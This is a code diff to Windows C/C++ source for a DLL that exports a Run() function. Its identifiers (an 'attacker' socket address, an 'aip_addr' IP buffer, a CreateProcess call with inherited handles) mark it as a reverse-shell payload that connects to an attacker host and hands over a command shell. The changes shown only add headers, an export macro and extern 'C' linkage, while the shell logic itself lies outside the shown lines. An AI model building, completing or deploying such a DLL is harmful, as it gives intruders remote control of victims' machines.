@@ -1,7 +1,12 @@
+
+#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
+#include <windows.h>
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
 #include <stdio.h>
-#include "reverse.h"
+#include <cstdlib>
+
+#define EXPORT __declspec(dllexport)
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -11,6 +16,11 @@ struct sockaddr_in attacker;
 char aip_addr[16];
 STARTUPINFO sui;
 PROCESS_INFORMATION pi;
+
+#ifdef __cplusplus
+extern "C"
+{
+#endif
 
 EXPORT void Run(void)
 {
@@ -38,6 +48,10 @@ EXPORT void Run(void)
 	CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
 
 }
+
+#ifdef __cplusplus
+}
+#endif
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
